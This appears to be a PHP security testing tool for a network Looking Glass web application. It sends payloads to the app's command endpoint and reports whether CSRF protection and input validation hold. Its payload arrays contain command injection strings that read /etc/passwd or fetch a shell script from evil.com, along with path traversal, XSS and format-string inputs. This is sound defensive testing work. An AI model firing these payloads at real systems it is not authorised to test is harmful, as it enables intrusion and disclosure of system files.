<?php
/**
 * Looking Glass Security Testing Suite - Config-driven
 *
 * Usage:
 *   php looking_glass_security_tester_config.php --url=http://localhost:8181 --config=./config.php
 */

require_once('includes/config.defaults.php');

class LookingGlassSecurityTesterConfig {
    private $base_url;
    private $config;
    private $results = array();
    private $verbose = true;
    private $test_csrf = true;
    private $csrf_token_cache = null;
    private $include_disabled = false;

    // Test payloads for different vulnerability types (initialized in constructor)
    private $payloads = array();

    private $no_parameter_commands = array(
        'speed-test-1mb',
        'speed-test-10mb',
        'speed-test-100mb',
        'system-info'
    );

    public function __construct($base_url, $config, $include_disabled = false) {
        $this->base_url = rtrim($base_url, '/');
        $this->config = $config;
        $this->include_disabled = $include_disabled;
        $this->payloads = $this->buildPayloads();
    }

    private function buildPayloads() {
        return array(
            'command_injection' => array(
                '; cat /etc/passwd',
                '| ls -la /',
                '`whoami`',
                '$(cat /etc/passwd)',
                '&& id',
                '; wget http://evil.com/shell.sh',
                "\n/bin/cat /etc/passwd",
                '%0a/bin/ls',
                '||/bin/ls',
                '; echo vulnerable > /tmp/test.txt',
                '`touch /tmp/vulnerable`',
                '$(touch /tmp/vulnerable2)',
                '; sleep 10',
                '| sleep 10',
            ),
            'path_traversal' => array(
                '../../../../etc/passwd',
                '..\\..\\..\\..\\windows\\system32\\config\\sam',
                '....//....//....//etc/passwd',
                '..;/..;/..;/etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
            ),
            'xss' => array(
                '<script>alert("XSS")</script>',
                '"><script>alert(1)</script>',
                '\';alert(1);//',
                'javascript:alert(1)',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '${alert(1)}',
                '<iframe src="javascript:alert(1)">',
            ),
            'buffer_overflow' => array(
                str_repeat('A', 300),
                str_repeat('B', 100),
                '%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s',
                '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x',
            )
        );
    }

    public function runTests() {
        $this->printHeader();

        if ($this->test_csrf) {
            $this->testCSRFProtection();
        }

        $routers = $this->getRoutersFromConfig();
        foreach ($routers as $router) {
            $this->testRouter($router);
        }

        $this->printSummary();
    }

    private function testCSRFProtection() {
        $this->printSection("CSRF Protection Test");

        $first_router = $this->getFirstRouter();
        if ($first_router === null) {
            $this->printResult('WARN', 'No routers found; CSRF tests skipped');
            echo "\n";
            return;
        }

        $this->println("Testing request without CSRF token... ", false);
        $response = $this->makeRequest($this->buildRequestParams(
            $first_router, 'ping', '8.8.8.8', false
        ));

        if ($this->containsError($response, array('csrf', 'token', 'security'))) {
            $this->printResult('PASS', 'CSRF protection active');
            $this->results['csrf']['without_token'] = 'PASS';
        } else {
            $this->printResult('FAIL', 'No CSRF protection detected');
            $this->results['csrf']['without_token'] = 'FAIL';
        }

        $this->println("Testing request with invalid CSRF token... ", false);
        $response = $this->makeRequest($this->buildRequestParams(
            $first_router, 'ping', '8.8.8.8', 'invalid_token_12345'
        ));

        if ($this->containsError($response, array('csrf', 'token', 'invalid', 'security'))) {
            $this->printResult('PASS', 'Invalid token rejected');
            $this->results['csrf']['invalid_token'] = 'PASS';
        } else {
            $this->printResult('WARN', 'Invalid token may be accepted');
            $this->results['csrf']['invalid_token'] = 'WARN';
        }

        $this->println("Attempting to retrieve valid CSRF token... ", false);
        $csrf_token = $this->getCSRFToken();
        if ($csrf_token) {
            $this->printResult('INFO', "Token retrieved: " . substr($csrf_token, 0, 20) . "...");
            $response = $this->makeRequest($this->buildRequestParams(
                $first_router, 'ping', '8.8.8.8', $csrf_token
            ));
            if (!$this->containsError($response, array('csrf', 'token'))) {
                $this->printResult('PASS', 'Valid token accepted');
                $this->results['csrf']['valid_token'] = 'PASS';
            }
        } else {
            $this->printResult('INFO', 'Could not retrieve token from index page');
        }

        echo "\n";
    }

    private function testRouter($router) {
        $label = strtoupper($router['id']);
        if (!empty($router['datacenter_id'])) {
            $label .= ' ('.$router['datacenter_id'].')';
        }
        $this->printSection("Testing Router: " . $label);

        $commands = $this->getEnabledCommands($router);
        foreach ($commands as $command_info) {
            $this->testCommand($router, $command_info);
        }

        echo "\n";
    }

    private function testCommand($router, $command_info) {
        $command = $command_info['command'];
        $not_implemented_expected = $command_info['expect_not_implemented'];

        $this->println("\nTesting command: $command\n", true);

        if ($not_implemented_expected) {
            $this->testNotImplemented($router, $command);
            return;
        }

        if (!in_array($command, $this->no_parameter_commands)) {
            $this->testVulnerability($router, $command, 'command_injection');
            if (in_array($command, array('ping', 'traceroute'))) {
                $this->testVulnerability($router, $command, 'path_traversal');
            }
            $this->testVulnerability($router, $command, 'xss');
            $this->testVulnerability($router, $command, 'buffer_overflow');
        }

        $this->testLegitimateInputs($router, $command);
    }

    private function testNotImplemented($router, $command) {
        $parameter = $this->getSampleParameterForCommand($command);
        $response = $this->makeRequest($this->buildRequestParams(
            $router, $command, $parameter, $this->getCachedCSRFToken()
        ));

        $decoded = json_decode($response, true);
        $error = null;
        if (is_array($decoded) && isset($decoded['error'])) {
            $error = $decoded['error'];
        } else {
            $error = $this->extractErrorMessage($response);
        }

        $status = 'FAIL';
        if ($this->containsError($error, array('only available', 'not supported', 'does not support'))) {
            $status = 'PASS';
        } elseif ($this->include_disabled && $this->isDisabledResponse($error)) {
            $status = 'PASS';
        }

        $this->println("  not_implemented: [$status]", true);
        if ($this->verbose && $error) {
            $this->println("    Sample error: " . $error, true);
        }
        $this->results[$this->getRouterKey($router)][$command]['not_implemented'] = array(
            'status' => $status,
            'sample_error' => $error
        );
    }

    private function testVulnerability($router, $command, $vuln_type) {
        $payloads = isset($this->payloads[$vuln_type]) ? $this->payloads[$vuln_type] : array();
        $blocked = 0;
        $vulnerable = 0;
        $errors = array();
        $sample_vulnerable_payload = null;
        $sample_vulnerable_response = null;
        $sample_unblocked_response = null;

        foreach ($payloads as $payload) {
            $base_input = $this->getBaseInputForCommand($command);
            $test_param = ($vuln_type === 'legitimate_inputs')
                ? $payload
                : $base_input . $payload;

            if ($vuln_type === 'buffer_overflow') {
                $test_param = $payload;
            }

            $start_time = microtime(true);
            $response = $this->makeRequest($this->buildRequestParams(
                $router, $command, $test_param, $this->getCachedCSRFToken()
            ));
            $exec_time = microtime(true) - $start_time;

            if ($this->isVulnerable($response, $vuln_type, $exec_time)) {
                $vulnerable++;
                $errors[] = substr($payload, 0, 30) . "...";
                if ($sample_vulnerable_payload === null) {
                    $sample_vulnerable_payload = $payload;
                    $sample_vulnerable_response = $this->extractErrorMessage($response);
                }
            } elseif ($this->isBlocked($response)) {
                $blocked++;
            } elseif ($sample_unblocked_response === null) {
                $sample_unblocked_response = $this->extractErrorMessage($response);
            }
        }

        $total = count($payloads);
        $status = ($vulnerable > 0) ? 'FAIL' : (($blocked === $total) ? 'PASS' : 'WARN');

        $recommendation = null;
        if ($status === 'WARN' && $vuln_type === 'buffer_overflow') {
            $recommendation = 'Ensure oversized inputs are blocked locally (before sending to the router). '
                . 'If the sample response is a router CLI error, tighten input validation and length limits.';
        }

        $this->println("  $vuln_type: ", false);
        $this->println("[$status]", false);
        $this->println(" Blocked: $blocked/$total", false);

        if ($vulnerable > 0) {
            $this->println(" VULNERABLE: $vulnerable", false);
            if ($this->verbose && count($errors) > 0) {
                $this->println("\n    Vulnerable payloads: " . implode(', ', array_slice($errors, 0, 3)), false);
            }
        }
        $this->println("\n", false);

        if ($this->verbose && $vulnerable > 0 && $sample_vulnerable_response !== null) {
            $this->println("    Sample payload: " . $sample_vulnerable_payload, true);
            $this->println("    Sample response: " . $sample_vulnerable_response, true);
        }
        if ($this->verbose && $status === 'WARN' && $sample_unblocked_response !== null) {
            $this->println("    Sample response: " . $sample_unblocked_response, true);
        }
        if ($this->verbose && $recommendation !== null) {
            $this->println("    Recommendation: " . $recommendation, true);
        }

        $this->results[$this->getRouterKey($router)][$command][$vuln_type] = array(
            'status' => $status,
            'blocked' => $blocked,
            'total' => $total,
            'vulnerable' => $vulnerable,
            'sample_payload' => $sample_vulnerable_payload,
            'sample_response' => $sample_vulnerable_response,
            'sample_unblocked_response' => $sample_unblocked_response,
            'recommendation' => $recommendation
        );
    }

    private function testLegitimateInputs($router, $command) {
        $working = 0;
        $total = 0;
        $timeouts = 0;
        $sample_error = null;
        $sample_input = null;

        $inputs = $this->getLegitimateInputsForCommand($command);
        foreach ($inputs as $input) {
            $total++;
            $response = $this->makeRequest($this->buildRequestParams(
                $router, $command, $input, $this->getCachedCSRFToken()
            ));

            if ($this->include_disabled && $this->isDisabledResponse($response)) {
                $working++;
                continue;
            }

            $decoded = json_decode($response, true);
            if (is_array($decoded)) {
                if (isset($decoded['result'])) {
                    if ($this->isExpectedResult($command, $decoded['result'])) {
                        $working++;
                        continue;
                    }
                    if ($this->isTimeoutError($decoded['result'])) {
                        $timeouts++;
                        if ($sample_error === null) {
                            $sample_error = $this->extractErrorMessage($decoded['result']);
                            $sample_input = $input;
                        }
                        continue;
                    }
                    if ($sample_error === null) {
                        $sample_error = $this->extractErrorMessage($decoded['result']);
                        $sample_input = $input;
                    }
                    continue;
                }
                if (isset($decoded['error'])) {
                    if ($this->isTimeoutError($decoded['error'])) {
                        $timeouts++;
                        if ($sample_error === null) {
                            $sample_error = $decoded['error'];
                            $sample_input = $input;
                        }
                        continue;
                    }
                    if ($sample_error === null) {
                        $sample_error = $decoded['error'];
                        $sample_input = $input;
                    }
                    continue;
                }
            }

            if (!$this->containsError($response, array('error', 'invalid', 'failed'))) {
                $working++;
            } elseif ($this->isTimeoutError($response)) {
                $timeouts++;
                if ($sample_error === null) {
                    $sample_error = $this->extractErrorMessage($response);
                    $sample_input = $input;
                }
            } elseif ($sample_error === null) {
                $sample_error = $this->extractErrorMessage($response);
                $sample_input = $input;
            }
        }

        $status = ($working === $total) ? 'PASS' : (($working > 0 || $timeouts > 0) ? 'WARN' : 'FAIL');

        $this->println("  legitimate_inputs: ", false);
        $this->println("[$status]", false);
        $this->println(" Working: $working/$total\n", false);

        $this->results[$this->getRouterKey($router)][$command]['legitimate'] = array(
            'status' => $status,
            'working' => $working,
            'total' => $total,
            'timeouts' => $timeouts,
            'sample_input' => $sample_input,
            'sample_error' => $sample_error
        );

        if ($this->verbose && $status !== 'PASS' && $sample_error !== null) {
            $this->println("    Sample input: " . $sample_input, true);
            $this->println("    Sample error: " . $sample_error, true);
        }
    }

    private function isVulnerable($response, $vuln_type, $exec_time = 0) {
        $normalized = $this->normalizeResponseText($response);
        if ($vuln_type === 'command_injection') {
            if (preg_match('/root:|daemon:|bin:|nobody:|www-data:/', $normalized)) {
                return true;
            }
            if (preg_match('/dr[w-]xr-xr-x|total \d+|\.bashrc|\.profile/', $normalized)) {
                return true;
            }
            if (preg_match('/uid=|gid=|groups=/', $normalized)) {
                return true;
            }
            if (preg_match('/vulnerable|test\.txt/', $normalized)) {
                return true;
            }
        }

        if ($vuln_type === 'path_traversal') {
            if (preg_match('/root:|\/etc\/passwd|\/windows\/system32/', $normalized)) {
                return true;
            }
        }

        if ($vuln_type === 'xss') {
            // Only flag raw HTML injection (escaped output should not match)
            $output = $this->stripCommandOutput($response);
            if (preg_match('/<\s*(script|img|svg|iframe)\b|javascript:/i', $output)) {
                return true;
            }
        }

        return false;
    }

    private function isBlocked($response) {
        if ($this->include_disabled && $this->isDisabledResponse($response)) {
            return true;
        }
        $decoded = json_decode($response, true);
        if (is_array($decoded) && isset($decoded['error'])) {
            return true;
        }
        $block_indicators = array(
            'error', 'invalid', 'denied', 'blocked', 'forbidden',
            'not allowed', 'security', 'violation', 'illegal',
            'unauthorized', 'failed', 'rejected'
        );

        return $this->containsError($this->normalizeResponseText($response), $block_indicators);
    }

    private function containsError($response, $indicators) {
        $response_lower = strtolower($response);
        foreach ($indicators as $indicator) {
            if (strpos($response_lower, strtolower($indicator)) !== false) {
                return true;
            }
        }
        return false;
    }

    private function isTimeoutError($response) {
        return $this->containsError($response, array(
            'maximum execution time',
            'timed out',
            'timeout exceeded',
            'execution timeout',
            'operation timed out'
        ));
    }

    private function extractErrorMessage($response) {
        if (empty($response)) {
            return 'Empty response';
        }

        $decoded = json_decode($response, true);
        if (is_array($decoded) && isset($decoded['error'])) {
            return $decoded['error'];
        }

        $stripped = trim(strip_tags($response));
        if (strlen($stripped) > 200) {
            return substr($stripped, 0, 200) . '...';
        }
        return $stripped;
    }

    private function normalizeResponseText($response) {
        $payload = $response;
        $decoded = json_decode($response, true);
        if (is_array($decoded)) {
            if (isset($decoded['result'])) {
                $payload = $decoded['result'];
            } elseif (isset($decoded['error'])) {
                $payload = $decoded['error'];
            }
        }

        $payload = html_entity_decode($payload, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        $payload = strip_tags($payload);
        $command_pos = stripos($payload, 'Command:');
        if ($command_pos !== false) {
            $header_pos = strpos($payload, '===');
            if ($header_pos !== false && $header_pos > $command_pos) {
                $payload = substr($payload, $header_pos);
            }
        }
        $lines = preg_split('/\r\n|\r|\n/', $payload);
        $filtered = array();
        foreach ($lines as $line) {
            $trimmed = trim($line);
            if ($trimmed === '') {
                continue;
            }
            if (stripos($trimmed, 'command:') === 0) {
                continue;
            }
            if (stripos($trimmed, '===') === 0) {
                continue;
            }
            if (stripos($trimmed, 'lookup for') !== false) {
                continue;
            }
            $filtered[] = $trimmed;
        }
        return strtolower(implode("\n", $filtered));
    }

    private function stripCommandOutput($response) {
        $payload = $response;
        $decoded = json_decode($response, true);
        if (is_array($decoded)) {
            if (isset($decoded['result'])) {
                $payload = $decoded['result'];
            } elseif (isset($decoded['error'])) {
                $payload = $decoded['error'];
            }
        }

        $command_pos = stripos($payload, 'Command:');
        if ($command_pos !== false) {
            $end_pos = stripos($payload, '</p>', $command_pos);
            if ($end_pos !== false) {
                $payload = substr_replace($payload, '', $command_pos, ($end_pos - $command_pos + 4));
            }
        }

        return $payload;
    }

    private function isDisabledResponse($response) {
        $text = strtolower($this->extractErrorMessage($response));
        return (strpos($text, 'disabled in the configuration') !== false ||
                strpos($text, 'disabled by default') !== false ||
                strpos($text, 'disabled for this router') !== false);
    }

    private function isExpectedResult($command, $result) {
        $text = strtolower($result);
        $error_markers = array(
            'unknown command',
            'cli syntax error',
            'invalid command',
            'error:'
        );
        foreach ($error_markers as $marker) {
            if (strpos($text, $marker) !== false) {
                return false;
            }
        }

        switch ($command) {
            case 'as':
            case 'as-path-regex':
                return (strpos($text, 'bgp table version') !== false ||
                        strpos($text, 'displayed ') !== false);
            case 'bgp':
                return (strpos($text, 'bgp table version') !== false ||
                        strpos($text, 'bgp routing table entry') !== false ||
                        strpos($text, 'route') !== false);
            case 'ping':
            case 'traceroute':
            case 'mtr':
                return (strpos($text, 'ping') !== false ||
                        strpos($text, 'traceroute') !== false ||
                        strpos($text, 'mtr') !== false);
            default:
                return true;
        }
    }

    private function buildRequestParams($router, $command, $parameter, $csrf_token = null) {
        $params = array(
            'query' => $command,
            'parameter' => $parameter,
            'dontlook' => ''
        );

        if (!empty($csrf_token)) {
            $params['csrf_token'] = $csrf_token;
        }

        $params['routers'] = $router['id'];
        if (!empty($router['datacenter_id'])) {
            $params['datacenters'] = $router['datacenter_id'];
        }

        return $params;
    }

    private function getCachedCSRFToken() {
        if ($this->csrf_token_cache !== null) {
            return $this->csrf_token_cache;
        }
        $this->csrf_token_cache = $this->getCSRFToken();
        return $this->csrf_token_cache;
    }

    private function getBaseInputForCommand($command) {
        switch ($command) {
            case 'as':
                return '13335';
            case 'as-path-regex':
                return '^13335$';
            default:
                return '8.8.8.8';
        }
    }

    private function getSampleParameterForCommand($command) {
        switch ($command) {
            case 'as':
                return '13335';
            case 'as-path-regex':
                return '^13335$';
            case 'bgp':
            case 'ping':
            case 'traceroute':
            case 'mtr':
                return '8.8.8.8';
            case 'dns-lookup':
                return 'example.com';
            case 'whois-lookup':
                return '8.8.8.8';
            case 'interface-stats':
                return 'eth0';
            default:
                return '';
        }
    }

    private function getLegitimateInputsForCommand($command) {
        switch ($command) {
            case 'ping':
            case 'traceroute':
            case 'mtr':
                return array('8.8.8.8', '2001:4860:4860::8888', 'google.com');
            case 'bgp':
                return array('8.8.8.8', '2001:4860:4860::8888');
            case 'as-path-regex':
                return array('^13335$', '^13335_.*');
            case 'as':
                return array('13335');
            default:
                return array('8.8.8.8');
        }
    }

    private function getCSRFToken() {
        $url = $this->base_url . '/index.php';
        $cookie_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'lg_cookies.txt';

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);

        $response = curl_exec($ch);
        curl_close($ch);

        if (preg_match('/name=["\']csrf_token["\'].*?value=["\']([^"\']+)["\']/', $response, $matches)) {
            return $matches[1];
        }

        return null;
    }

    private function makeRequest($params) {
        $url = $this->base_url . '/execute.php';
        $cookie_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'lg_cookies.txt';

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 45);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);

        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            return "CURL Error: " . $error;
        }

        return $response ? $response : '';
    }

    private function getRoutersFromConfig() {
        $routers = array();

        if (isset($this->config['datacenters']) && is_array($this->config['datacenters'])) {
            foreach ($this->config['datacenters'] as $dc_id => $dc) {
                if (!isset($dc['routers']) || !is_array($dc['routers'])) {
                    continue;
                }
                foreach ($dc['routers'] as $router_id => $router_config) {
                    $routers[] = array(
                        'id' => $router_id,
                        'datacenter_id' => $dc_id,
                        'config' => $router_config,
                        'datacenter_config' => $dc
                    );
                }
            }
        }

        if (isset($this->config['routers']) && is_array($this->config['routers'])) {
            foreach ($this->config['routers'] as $router_id => $router_config) {
                $routers[] = array(
                    'id' => $router_id,
                    'datacenter_id' => null,
                    'config' => $router_config,
                    'datacenter_config' => null
                );
            }
        }

        return $routers;
    }

    private function getFirstRouter() {
        $routers = $this->getRoutersFromConfig();
        return count($routers) > 0 ? $routers[0] : null;
    }

    private function getRouterKey($router) {
        if (!empty($router['datacenter_id'])) {
            return $router['id'] . ' (' . $router['datacenter_id'] . ')';
        }
        return $router['id'];
    }

    private function getEnabledCommands($router) {
        $commands = array();
        $doc = $this->config['doc'] ?? array();
        $router_config = $router['config'];
        $datacenter_config = $router['datacenter_config'];
        $router_type = strtolower($router_config['type'] ?? '');

        foreach (array_keys($doc) as $cmd) {
            if (!isset($doc[$cmd]['command'])) {
                continue;
            }

            $command_enabled = true;
            if (isset($doc[$cmd]['enabled']) && !$doc[$cmd]['enabled']) {
                $command_enabled = false;
            }
            if (!$command_enabled && !$this->include_disabled) {
                continue;
            }

            if (!$this->include_disabled &&
                isset($router_config[$cmd]['disable']) && $router_config[$cmd]['disable']) {
                continue;
            }

            $expect_not_implemented = false;
            if (in_array($cmd, array('interface-stats', 'system-info'))) {
                if ($router_type !== 'justlinux') {
                    $expect_not_implemented = true;
                }
            }

            if ($cmd === 'mtr' && !$this->routerSupportsMtr($router_type)) {
                $expect_not_implemented = true;
            }

            if (in_array($cmd, array('speed-test-1mb', 'speed-test-10mb', 'speed-test-100mb'))) {
                $delegated = $this->speedTestsAvailable($router_config, $datacenter_config);
                if (!$delegated && !$this->routerSupportsSpeedTests($router_type)) {
                    $expect_not_implemented = true;
                } elseif (!$delegated && !$this->include_disabled) {
                    continue;
                }
            } elseif (in_array($cmd, array('dns-lookup', 'whois-lookup'))) {
                $delegated = $this->dnsWhoisAvailable($router_config, $datacenter_config, $cmd);
                if (!$delegated && !$this->routerSupportsDnsWhois($router_type)) {
                    $expect_not_implemented = true;
                } elseif (!$delegated && !$this->include_disabled) {
                    continue;
                }
            } elseif (in_array($cmd, array('bgp', 'as-path-regex', 'as'))) {
                if (in_array($router_type, array('justlinux', 'speedtest'))) {
                    $expect_not_implemented = true;
                }
            }

            $commands[] = array(
                'command' => $cmd,
                'expect_not_implemented' => $expect_not_implemented
            );
        }

        return $commands;
    }

    private function routerSupportsMtr($router_type) {
        $unix_types = array('bird', 'bird2', 'quagga', 'frr', 'vyos', 'openbgpd', 'tnsr', 'justlinux', 'speedtest');
        return in_array($router_type, $unix_types);
    }

    private function routerSupportsSpeedTests($router_type) {
        return ($router_type === 'justlinux' || $router_type === 'speedtest');
    }

    private function routerSupportsDnsWhois($router_type) {
        return ($router_type === 'justlinux' || $router_type === 'speedtest');
    }

    private function speedTestsAvailable($router_config, $datacenter_config = null) {
        $router_type = strtolower($router_config['type'] ?? '');

        if (isset($router_config['speed_test']['router']) && !empty($router_config['speed_test']['router'])) {
            return true;
        }
        if ($datacenter_config && isset($datacenter_config['speed_test']['router']) &&
            !empty($datacenter_config['speed_test']['router'])) {
            return true;
        }
        if (isset($router_config['speed_test']['disabled']) && $router_config['speed_test']['disabled'] === false) {
            return $this->routerSupportsSpeedTests($router_type);
        }

        return false;
    }

    private function dnsWhoisAvailable($router_config, $datacenter_config = null, $command_type = 'dns-lookup') {
        $router_type = strtolower($router_config['type'] ?? '');
        $config_key = ($command_type === 'whois-lookup') ? 'whois_lookup' : 'dns_lookup';

        if (isset($router_config[$config_key]['router']) && !empty($router_config[$config_key]['router'])) {
            return true;
        }
        if ($datacenter_config && isset($datacenter_config[$config_key]['router']) &&
            !empty($datacenter_config[$config_key]['router'])) {
            return true;
        }
        if (isset($router_config[$config_key]['disabled']) && $router_config[$config_key]['disabled'] === false) {
            return $this->routerSupportsDnsWhois($router_type);
        }

        return false;
    }

    private function printHeader() {
        echo "\n";
        echo "=========================================\n";
        echo "  Looking Glass Security Testing Suite\n";
        echo "=========================================\n\n";
        echo "Target: " . $this->base_url . "\n";
        echo "Date: " . date('Y-m-d H:i:s') . "\n";
        echo "\n";
    }

    private function printSection($title) {
        echo "\n";
        echo "--- $title ---\n\n";
    }

    private function println($text, $newline = true) {
        echo $text;
        if ($newline) echo "\n";
    }

    private function printResult($status, $message) {
        echo "[$status] $message\n";
    }

    private function printSummary() {
        $this->printSection("SUMMARY");

        $total_pass = 0;
        $total_fail = 0;
        $total_warn = 0;

        foreach ($this->results as $router => $commands) {
            if ($router === 'csrf') continue;
            foreach ($commands as $command => $tests) {
                foreach ($tests as $test => $result) {
                    if (isset($result['status'])) {
                        switch($result['status']) {
                            case 'PASS': $total_pass++; break;
                            case 'FAIL': $total_fail++; break;
                            case 'WARN': $total_warn++; break;
                        }
                    }
                }
            }
        }

        echo "Total Tests Run: " . ($total_pass + $total_fail + $total_warn) . "\n";
        echo "Passed: $total_pass\n";
        echo "Failed: $total_fail\n";
        echo "Warnings: $total_warn\n";

        if ($total_fail > 0) {
            echo "\nCRITICAL ISSUES FOUND:\n";
            foreach ($this->results as $router => $commands) {
                if ($router === 'csrf') continue;
                foreach ($commands as $command => $tests) {
                    foreach ($tests as $test => $result) {
                        if (isset($result['status']) && $result['status'] === 'FAIL') {
                            echo "  - $router/$command: $test\n";
                        }
                    }
                }
            }
        }

        $this->saveReport();
    }

    private function saveReport() {
        $report = array(
            'timestamp' => date('Y-m-d H:i:s'),
            'target' => $this->base_url,
            'results' => $this->results,
            'summary' => array(
                'total_tests' => count($this->results),
                'vulnerabilities_found' => $this->countVulnerabilities()
            )
        );

        $filename = 'lg_security_report_' . date('Ymd_His') . '.json';
        file_put_contents($filename, json_encode($report, JSON_PRETTY_PRINT));

        echo "\nDetailed report saved to: $filename\n";
    }

    private function countVulnerabilities() {
        $count = 0;
        foreach ($this->results as $router => $commands) {
            if ($router === 'csrf') continue;
            foreach ($commands as $command => $tests) {
                foreach ($tests as $test => $result) {
                    if (isset($result['vulnerable']) && $result['vulnerable'] > 0) {
                        $count += $result['vulnerable'];
                    }
                }
            }
        }
        return $count;
    }
}

if (php_sapi_name() === 'cli') {
    $options = getopt('', array('url:', 'config:', 'help', 'no-csrf', 'verbose', 'include-disabled'));

    if (isset($options['help'])) {
        echo "Looking Glass Security Testing Suite - Config-driven\n\n";
        echo "Usage: php looking_glass_security_tester_config.php --url=URL --config=PATH [OPTIONS]\n\n";
        echo "Options:\n";
        echo "  --url=URL        Base URL of Looking Glass (required)\n";
        echo "  --config=PATH    Path to config.php (required)\n";
        echo "  --no-csrf        Skip CSRF protection tests\n";
        echo "  --include-disabled  Run tests even for disabled commands\n";
        echo "  --verbose        Show detailed output\n\n";
        exit(0);
    }

    if (!isset($options['url']) || !isset($options['config'])) {
        echo "Error: --url and --config are required\n";
        echo "Use --help for usage information\n";
        exit(1);
    }

    $config_path = $options['config'];
    if (!file_exists($config_path)) {
        echo "Error: config file not found: $config_path\n";
        exit(1);
    }

    // Load config defaults and user config
    require_once($config_path);
    if (isset($config) && is_array($config)) {
        set_defaults_for_routers($config);
    }

    $include_disabled = isset($options['include-disabled']);
    $tester = new LookingGlassSecurityTesterConfig($options['url'], $config ?? array(), $include_disabled);

    if (isset($options['no-csrf'])) {
        $tester->test_csrf = false;
    }
    if (isset($options['verbose'])) {
        $tester->verbose = true;
    }

    $tester->runTests();
}
